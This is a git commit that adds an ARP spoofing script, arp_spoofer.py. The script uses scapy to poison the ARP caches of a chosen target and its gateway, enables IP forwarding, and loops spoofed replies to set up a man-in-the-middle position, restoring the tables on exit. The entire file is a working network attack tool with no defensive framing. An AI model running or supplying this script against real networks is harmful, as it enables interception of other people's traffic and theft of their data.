b4a6a73510c38c1fef9a41017b7cccc2323cb37b
Warren Leyes <warren.leyes@gmail.com>
2019-12-31 18:10:05 -0500

    Initial commit

---
+++ arp_spoofer.py
@@ -0,0 +1,69 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import subprocess
+import optparse
+import time
+import sys
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target_ip", help="Set target ip.")
+    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Set gateway/router ip.")
+    (options, arguments) = parser.parse_args()
+    if not options.target_ip:
+        parser.error("[-] Please specify a target ip, use --help for more information.")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify a gateway/router ip, use --help for more information.")
+    return options
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    retries = 4
+    for i in range(retries):
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        if answered_list:
+            return answered_list[0][1].hwsrc
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    if target_mac:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+options = get_arguments()
+
+target_ip = options.target_ip
+gateway_ip = options.gateway_ip
+
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
+try:
+    sent_packets_count = 0
+    print("Use CTRL + C to quit application.")
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Resetting ARP table, please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("The ARP table has been restored. Exiting...")
